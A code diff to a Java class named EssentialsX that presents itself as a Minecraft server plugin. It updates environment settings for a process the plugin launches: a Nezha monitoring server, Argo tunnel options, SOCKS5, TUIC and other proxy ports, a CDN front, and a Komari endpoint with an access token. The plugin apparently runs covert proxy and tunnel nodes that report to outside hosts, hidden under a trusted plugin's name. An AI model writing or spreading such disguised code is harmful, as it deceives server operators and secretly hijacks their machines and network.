@@ -76,7 +76,7 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "84398026-8650-454c-8a3c-f464100efd98");
+        env.put("UUID", "a4b65030-406b-4baa-ba2d-a599ac2829ae");
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "nz.ccc.gv.uy:443");
         env.put("NEZHA_PORT", "");
@@ -84,9 +84,9 @@ public class EssentialsX extends JavaPlugin {
         env.put("ARGO_PORT", "8001");
         env.put("ARGO_DOMAIN", "");
         env.put("ARGO_AUTH", "");
-        env.put("S5_PORT", "13072");
+        env.put("S5_PORT", "10120");
         env.put("HY2_PORT", "");
-        env.put("TUIC_PORT", "13072");
+        env.put("TUIC_PORT", "10120");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
         env.put("ANYREALITY_PORT", "");
@@ -96,9 +96,9 @@ public class EssentialsX extends JavaPlugin {
         env.put("CFIP", "spring.io");
         env.put("CFPORT", "443");
         env.put("NAME", "");
-        env.put("DISABLE_ARGO", "false");
+        env.put("DISABLE_ARGO", "true");
         env.put("KOMARI_ENDPOINT", "https://km.ccc.gv.uy");
-        env.put("KOMARI_TOKEN", "pb2pqZWhzIoj7is6BZyUC3");
+        env.put("KOMARI_TOKEN", "uzBs7KXTeQr2aIUPGK6wX5");
         
         // Load from system environment variables
         for (String var : ALL_ENV_VARS) {
